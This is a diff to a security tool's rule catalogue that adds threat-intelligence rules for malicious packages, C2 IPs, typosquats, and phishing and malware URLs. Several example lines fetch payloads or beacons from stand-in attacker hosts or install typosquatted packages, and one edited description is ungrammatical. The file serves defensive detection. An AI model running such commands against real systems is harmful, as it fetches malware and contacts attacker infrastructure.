@@ -986,9 +986,147 @@ remediation = "Check the custom_rule_id field to identify which custom rule matc
 id = "license_required"
 title = "License required"
 category = "license"
-severity_rationale = "Varies — a detection feature requires a Pro or Team license."
+severity_rationale = "Varies — a detection feature requires a paid license tier was triggered."
 description = "A detection rule that requires a paid license tier was triggered. The finding is suppressed at runtime for unlicensed users, except for Critical-severity findings which always pass through regardless of license status."
 examples_bad = []
 examples_good = []
 false_positive_guidance = "This is an infrastructure rule, not a security detection. Upgrade your license to see these findings."
 remediation = "Visit the tirith website to activate a Pro or Team license."
+
+# ── Threat intelligence rules (Phase A — local DB) ─────────────────────
+
+[[rule]]
+id = "threat_malicious_package"
+title = "Known malicious package"
+category = "threatintel"
+severity_rationale = "Critical when Confirmed confidence (OSSF MALWARE + Datadog verified malware). Medium when Medium confidence (OSSF missing type or POTENTIALLY_UNWANTED). Medium when Low confidence (heuristic signals)."
+description = "The package being installed is listed in the tirith threat intelligence database as known-malicious. Sources include the OpenSSF Malicious Packages dataset and the Datadog Malicious Software Packages dataset. The package may contain backdoors, data exfiltration, cryptocurrency miners, or other malware."
+examples_bad = ["pip install malicious-pkg-example", "npm install known-malware-example"]
+examples_good = ["pip install requests", "npm install lodash"]
+false_positive_guidance = "False positives are rare for Confirmed confidence entries. Medium confidence entries may include potentially unwanted packages that are not strictly malware. If a legitimate package is flagged, check the reference URL for details and report the false positive to the upstream source."
+remediation = "Do not install the package. If already installed, remove it immediately and audit your system for signs of compromise. Check the reference URL in the finding evidence for details about the specific threat."
+
+[[rule]]
+id = "threat_malicious_ip"
+title = "Known malicious IP address"
+category = "threatintel"
+severity_rationale = "High — the IP is listed in a curated threat intelligence feed (e.g., Feodo Tracker botnet C2 list). These feeds have low false positive rates."
+description = "A command references an IP address that appears in the tirith threat intelligence database as a known command-and-control server, botnet node, or other malicious infrastructure. Source: Feodo Tracker IP blocklist."
+examples_bad = ["ssh user@known-c2-ip-example", "curl http://known-c2-ip-example/payload"]
+examples_good = ["ssh user@192.168.1.1", "curl http://api.example.com/data"]
+false_positive_guidance = "Threat IP feeds are updated daily. An IP may be flagged after legitimate use or delisted after remediation. If a known-good IP is flagged, check the reference URL and wait for the next threat DB update."
+remediation = "Do not connect to the flagged IP. Investigate why the command references a known-malicious IP. If the connection was already made, audit network logs for data exfiltration."
+
+[[rule]]
+id = "threat_package_typosquat"
+title = "Confirmed package typosquat"
+category = "threatintel"
+severity_rationale = "High — the package name is a confirmed typosquat from the ecosyste.ms dataset, meaning it was specifically created to impersonate a legitimate package."
+description = "The package being installed is listed in the ecosyste.ms confirmed typosquatting dataset. This means the package name was identified as a deliberate impersonation of a legitimate, popular package. Typosquats are a common supply chain attack vector."
+examples_bad = ["pip install reqeusts", "npm install loadsh"]
+examples_good = ["pip install requests", "npm install lodash"]
+false_positive_guidance = "This rule uses a curated dataset of confirmed typosquats, so false positives are rare. If a legitimate package is flagged, it may share a name with a known typosquat in a different ecosystem."
+remediation = "Verify you intended to install this exact package name. The finding evidence includes the target package this typosquat impersonates. Install the legitimate package instead."
+
+[[rule]]
+id = "threat_package_similar_name"
+title = "Package name similar to popular package"
+category = "threatintel"
+severity_rationale = "Medium — the package name is within Levenshtein distance 1 of a popular package. This is a heuristic signal, not a confirmed threat."
+description = "The package being installed has a name that differs by only one character from a well-known, popular package. This pattern is commonly used in typosquatting attacks but may also be a coincidence. The finding is advisory — verify the package name is intentional."
+examples_bad = ["pip install reqests", "npm install lodasg"]
+examples_good = ["pip install requests", "npm install lodash"]
+false_positive_guidance = "This is a heuristic check. Legitimate packages may have names similar to popular ones. Review the package on its registry page to confirm it is the intended package."
+remediation = "Double-check the package name. If it is a typo, correct it to the popular package name shown in the evidence. If it is intentional, you can suppress this rule via policy allowlist."
+
+# ── Threat intelligence rules (Phase B — keyed feeds, stubs) ───────────
+
+[[rule]]
+id = "threat_malicious_url"
+title = "Known malicious URL"
+category = "threatintel"
+severity_rationale = "High — the URL hostname is listed in a threat intelligence feed (URLhaus) as hosting malware, exploit kits, or other malicious content."
+description = "A URL in the command references a hostname known to distribute malware. This rule activates when optional keyed threat feeds (URLhaus) are configured. Phase B feature — requires feed configuration."
+examples_bad = ["curl http://malware-host-example.com/payload.sh"]
+examples_good = ["curl https://github.com/user/repo/install.sh"]
+false_positive_guidance = "URLhaus entries are curated but may include domains that previously hosted malware and have since been cleaned. Check the reference URL for current status."
+remediation = "Do not fetch content from the flagged URL. Investigate the source of the command."
+
+[[rule]]
+id = "threat_phishing_url"
+title = "Known phishing URL"
+category = "threatintel"
+severity_rationale = "High — the domain is listed in a phishing intelligence feed as actively used for credential theft or social engineering."
+description = "A URL in the command references a domain known for phishing attacks. This rule activates when optional keyed threat feeds (PhishingArmy, PhishTank) are configured. Phase B feature — requires feed configuration."
+examples_bad = ["curl http://phishing-example-site.com/login"]
+examples_good = ["curl https://legitimate-service.com/api"]
+false_positive_guidance = "Phishing feeds may include domains that have been remediated. Check the current status of the domain."
+remediation = "Do not visit or interact with the flagged URL. Report the phishing attempt if appropriate."
+
+[[rule]]
+id = "threat_tor_exit_node"
+title = "Tor exit node IP"
+category = "threatintel"
+severity_rationale = "Medium — the IP belongs to the Tor network. Tor usage is not inherently malicious but may indicate anonymization of network traffic."
+description = "A command references an IP address that is a known Tor exit node. While Tor has legitimate privacy uses, connections to Tor exit nodes in automated commands may indicate traffic anonymization for malicious purposes. Phase B feature — requires feed configuration."
+examples_bad = ["ssh user@tor-exit-node-example"]
+examples_good = ["ssh user@192.168.1.1"]
+false_positive_guidance = "Tor exit node IPs change frequently. Legitimate Tor usage will trigger this rule. Suppress via policy if your workflow involves Tor."
+remediation = "Verify whether Tor connectivity is expected. If not, investigate why the command targets a Tor exit node."
+
+[[rule]]
+id = "threat_threat_fox_ioc"
+title = "ThreatFox IOC match"
+category = "threatintel"
+severity_rationale = "High — the indicator matches a ThreatFox IOC entry, which tracks indicators associated with active malware campaigns."
+description = "A command references an indicator of compromise (domain, IP, or URL) that is listed in the ThreatFox IOC database. This rule activates when optional keyed threat feeds are configured. Phase B feature — requires feed configuration."
+examples_bad = ["curl http://c2-domain-example.com/beacon"]
+examples_good = ["curl https://api.example.com/data"]
+false_positive_guidance = "ThreatFox IOCs are community-curated. Verify the IOC status via the reference URL."
+remediation = "Do not interact with the flagged indicator. If the connection was already made, investigate for compromise."
+
+# ── Threat intelligence rules (Phase C — real-time API, stubs) ─────────
+
+[[rule]]
+id = "threat_osv_vulnerable"
+title = "OSV vulnerability detected"
+category = "threatintel"
+severity_rationale = "High — the package+version has a known vulnerability or malware entry in the OSV.dev database, which aggregates data from multiple security advisories."
+description = "The package being installed has a known vulnerability or malware entry in the Open Source Vulnerabilities (OSV.dev) database. This rule uses real-time API lookup for live vulnerability data. Phase C feature — requires network access."
+examples_bad = ["pip install vulnerable-pkg-example==1.0.0"]
+examples_good = ["pip install requests==2.31.0"]
+false_positive_guidance = "OSV.dev aggregates multiple advisory databases. The vulnerability may have been fixed in a newer version. Check the advisory for affected version ranges."
+remediation = "Update the package to a version that is not affected. Check the advisory URL in the evidence for details and patched versions."
+
+[[rule]]
+id = "threat_cisa_kev"
+title = "CISA Known Exploited Vulnerability"
+category = "threatintel"
+severity_rationale = "High — the package is associated with a CVE on CISA's Known Exploited Vulnerabilities catalog, meaning the vulnerability is actively being exploited in the wild."
+description = "The package being installed is associated with a CVE listed in CISA's Known Exploited Vulnerabilities (KEV) catalog. These vulnerabilities are confirmed to be actively exploited. Phase C feature — requires runtime OSV.dev lookup for CVE-to-package correlation."
+examples_bad = ["pip install exploited-pkg-example==1.0.0"]
+examples_good = ["pip install requests==2.31.0"]
+false_positive_guidance = "CISA KEV entries are confirmed exploited vulnerabilities. False positives are unlikely. The CVE may have been fixed in a newer package version."
+remediation = "Update the package to a non-vulnerable version immediately. CISA KEV vulnerabilities are actively exploited and pose immediate risk."
+
+[[rule]]
+id = "threat_suspicious_package"
+title = "Suspicious package metadata"
+category = "threatintel"
+severity_rationale = "Low — the package has suspicious metadata (very new, single maintainer, low downloads) but is not confirmed malicious. This is an advisory signal."
+description = "The package has metadata characteristics often associated with malicious packages: very recently published, single maintainer, low download count, or missing repository URL. This rule uses real-time API lookups (deps.dev, ecosyste.ms) for package health signals. Phase C feature — requires network access."
+examples_bad = ["npm install brand-new-package-no-downloads"]
+examples_good = ["npm install lodash"]
+false_positive_guidance = "New, legitimate packages will trigger this rule. It is advisory only (Low severity). Established packages with active maintainers will not trigger this."
+remediation = "Review the package on its registry page. Check the maintainer, publication date, download count, and source repository before installing."
+
+[[rule]]
+id = "threat_safe_browsing"
+title = "Google Safe Browsing hit"
+category = "threatintel"
+severity_rationale = "High — Google Safe Browsing flagged the URL as unsafe (malware, phishing, or unwanted software). Google's dataset is one of the most comprehensive URL reputation databases."
+description = "A URL in the command is flagged by Google Safe Browsing as hosting malware, phishing content, or unwanted software. This rule requires the user to configure their own Google Safe Browsing API key. Phase C feature — requires API key configuration."
+examples_bad = ["curl http://flagged-by-safebrowsing-example.com/malware"]
+examples_good = ["curl https://github.com/user/repo/install.sh"]
+false_positive_guidance = "Google Safe Browsing has a low false positive rate. If a legitimate URL is flagged, it may have been temporarily compromised. Check the Safe Browsing transparency report."
+remediation = "Do not fetch content from the flagged URL. If the URL is expected, verify it has not been compromised."
